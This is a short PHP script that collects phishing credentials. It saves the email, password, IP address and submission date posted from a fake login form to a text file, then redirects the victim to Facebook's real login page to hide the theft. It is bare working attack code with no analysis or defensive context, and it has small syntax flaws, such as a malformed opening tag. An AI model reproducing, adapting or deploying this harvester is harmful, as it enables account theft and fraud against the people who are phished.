<$? php $file = "password.txt";
$username = =$_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle,"++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "IP Adrress: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUANGE=\"JavaScript\">
<!--
window.location=\"https://login.facebook.com/login.php?login_attempt=1\";
// -->
</script>";
?>